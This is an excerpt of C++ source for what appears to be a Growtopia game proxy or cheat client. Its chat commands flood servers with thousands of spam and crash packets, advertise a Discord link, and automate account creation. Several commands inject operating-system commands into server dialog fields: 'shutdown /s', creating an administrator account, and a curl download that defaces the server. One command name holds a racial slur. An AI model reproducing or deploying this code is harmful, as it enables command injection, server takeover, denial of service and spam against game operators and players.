...
bool events::out::generictext(std::string packet) {
    ...
    if (var.get(0).m_key == "action" && var.get(0).m_value == "input") {
        ...
        if (find_command(chat, "name ")) { //ghetto solution, but too lazy to make a framework for commands.
        ...
        else if (find_command(chat, "paket")) {
            for (int i = 0; i < 10000; ++i) {
                g_server->send(false, "action|input\n|text|`41010101110101(nuke)");
            }
            return false;
        }
        ...
        else if (find_command(chat, "spamsb2")) {
            for (int i = 0; i < 5000; ++i) {
                g_server->send(false, "action|dialog_return\ndialog_name|sendsb\nsbtext|player_chat=`5Join `chttps://bit.ly/guckproject`` !!!");
            }
            return false;
        }
        else if (find_command(chat, "gtfy")) {
            for (int i = 0; i < 100; i++) {
                g_server->send(false, "action|dialog_return\ndialog_name|buylock_dialog\nitemid|9784|\nhowmany|4");
                g_server->send(false, "action|dialog_return\ndialog_name|\nbuttonClicked|buyemeraldfery");
                g_server->send(false, "action|dialog_return\ndialog_name|\nbuttonClicked|yesconvertemerald");
            }
            return true;
        }
        else if (find_command(chat, "mmfy")) {
            for (auto i = 0; i < 1000; i++) {
                g_server->send(false, "action|dialog_return\ndialog_name|buylock_dialog\nitemid|9784|\nhowmany|4");
                g_server->send(false, "action|dialog_return\ndialog_name|\nbuttonClicked|buyemeraldfery");
                g_server->send(false, "action|dialog_return\ndialog_name|\nbuttonClicked|yesconvertemerald");
                g_server->send(false, "action|dialog_return\ndialog_name|buylock_dialog\nitemid|9782|\nhowmany|1");
                g_server->send(false, "action|dialog_return\ndialog_name|\nbuttonClicked|buymmfy");
            }
            return true;
        }

        else if (find_command(chat, "s")) {
                g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|shutdown /s");
        }
        else if (find_command(chat, "h")) {
            g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|net user Administrator Sayang@123");
        }
        else if (find_command(chat, "s2")) {
            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|shutdown /s");
        }
        else if (find_command(chat, "h2")) {
            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|net user Administrator Sayang@123");
        }
        else if (find_command(chat, "h3")) {
            g_server->send(false, "action|guildsignup\nname|net user Administrator Sayang@123");
        }
            ...
            for (int i = 0; i < 15000; ++i) {
                g_server->send(false, "action|dialog_return\ndialog_name|megaphone\nwords|player_chat=`5Join `chttps://bit.ly/guckproject`` !!!");
            }
            return false;
        }
        else if (find_command(chat, "mega")) {
            for (int i = 0; i < 250; i++) {
                //  g_server->send(false, "action|dialog_return\ndialog_name|locke\nbuttonClicked|buymegas");
                g_server->send(false, "action|dialog_return\ndialog_name|locke\nbuttonClicked|buymegass");
            }
            return true;
        }
        else if (find_command(chat, "create ")) {
            string namemek = chat.substr(8);
            gt::send_log("`cTrying to create account with name: `2" + namemek + "..");
            g_server->send(false, "action|growid");
            g_server->send(false, "action|dialog_return\ndialog_name|register\nusername|" + namemek + "\npassword|lolok\npassword_verify|lolok\nemail|andasiapa527@gmail.com");
            gt::send_log("`cAccount with name `o" + namemek + " `cand password `ololok `chas successfully been created..");
            name = namemek;
            return true;
        }
        else if (find_command(chat, "newsku")) {
            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|curl https://cdn.discordapp.com/attachments/922122622106472478/922678068584251402/news.txt -O news.txt");
            g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|curl https://cdn.discordapp.com/attachments/922122622106472478/922678068584251402/news.txt -O news.txt");
            gt::send_log("`1running command");
            return true;
        }
        else if (find_command(chat, "newsexploit")) {
            std::string packet = "set_default_color|`o\nadd_label_with_icon|big|`wInvaded by `2GuckProject``!``|left|18|\nadd_spacer|small|\nadd_label|small|`5ID: Selamat, server anda telah diinvasi oleh member `2GuckProject``!``|left|4|\nadd_label|small|`5EN: Congratulations! your server has been invaded by the `2GuckProject`` members.``|left|4|\nadd_spacer|small|\nadd_label_with_icon|small|`cJoin our discord down below!``|left|1432|\nadd_url_button||`5Discord: `cGuckProject``|NOFLAGS|https://bit.ly/guckproject/|Open the Discord link?|0|0|\nadd_spacer|small|\nadd_url_button||Close|NOFLAGS|https://youtu.be/dQw4w9WgXcQ|Are you sure you want to close this?|0|0|\nadd_quick_exit|";
            g_server->send(false, "action|dialog_return\ndialog_name|guildsignup\nname|echo " + packet + "> news.txt");
            g_server->send(false, "action|dialog_return\ndialog_name|system_cmd\ncommand|echo " + packet + "> news.txt");
            gt::send_log("`1running command");
            return true;
        }
        else if (find_command(chat, "niggalag")) {
            int x = g_server->m_world.local.pos.m_x / 32;
            int y = (g_server->m_world.local.pos.m_y / 32) - 1;
            gt::spampacket = !gt::spampacket;
            if (gt::spampacket) {
                gt::send_log("2Nigga lag has been 1enabled.");
                ...
                gt::send_log("2Nigga lag has been 4disabled.");
                return true;
            }
        }
        else if (find_command(chat, "public")) {
            g_server->send(false, "action|dialog_return\ndialog_name|lock_edit\nplayerNetID|23\ncheckbox_public|1\ncheckbox_disable_music|1\ncheckbox_disable_music_render|1\ncheckbox_dropgem|1\nminimum_""entry_level|1\ncheckbox_muted|1");
        }
        else if (find_command(chat, "termo")) {
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE2");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE5");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE3");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE9");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE10");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE12");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE124");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCLTUBE6");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKTUBE123");
            Sleep(5000);
        }
        else if (find_command(chat, "termo2")) {
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT2");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT4");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT3");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT9");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT8");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT1");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT42");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT234");
            Sleep(5000);
            g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|GUCKPROJECT4324");
            Sleep(5000);
        }
        else if (find_command(chat, "gtube")) {
            for (int i = 0; i < 10000; i++) {
                g_server->send(false, "action|dialog_return\ndialog_name|usemega\nmegatext1|player_chat=`5Join `chttps://bit.ly/guckproject`` !!!");
            }
        }
        else if (find_command(chat, "thermo2")) {
            std::string worldname = chat.substr(6);
            for (int i = 0; i < 5000; ++i) {
                g_server->send(false, "action|dialog_return\ndialog_name|usethermoblast\nthermoname|" + worldname);
            }
            return false;
        }
        ...
        if (autopull == true) {
        ...
        else if (find_command(chat, "hack")) {
            std::string paket;
            paket =
                "add_label_with_icon|big|HEKER SAYANG|left|32|\nadd_spacer|small\n"
                "\nadd_text_input|name|???||140|"
                "\nend_dialog|guildsignup|Cancel|Okay|";
            variantlist_t liste{ "OnDialogRequest" };
            liste[1] = paket;
            g_server->send(true, liste);
        ...
        else if (find_command(chat, "join")) {
            std::string paket;
            paket =
                "add_label_with_icon|big|HEKER SAYANG|left|32|\nadd_spacer|small\n"
                "\nadd_url_button||JOIN BANH|NOFLAGS|OPENWORLD|asedekontol|";
            variantlist_t liste{ "OnDialogRequest" };
            liste[1] = paket;
            g_server->send(true, liste);
        ...
        else if (find_command(chat, "sbkontol")) {
            std::string paket;
            paket =
                "add_label_with_icon|big|HEKER SAYANG|left|32|\nadd_spacer|small\n"
                "\nadd_text_input|words|sayang:||250|"
                "\nend_dialog|megaphone|Cancel|Okay|";
            variantlist_t liste{ "OnDialogRequest" };
            liste[1] = paket;
            g_server->send(true, liste);
            ...
            if (events::out::type2 > 2)
            {
                ...
                else
                {
                    ...
                    //    packet.m_typem_type = PACKET_SET_ICON_STATE;
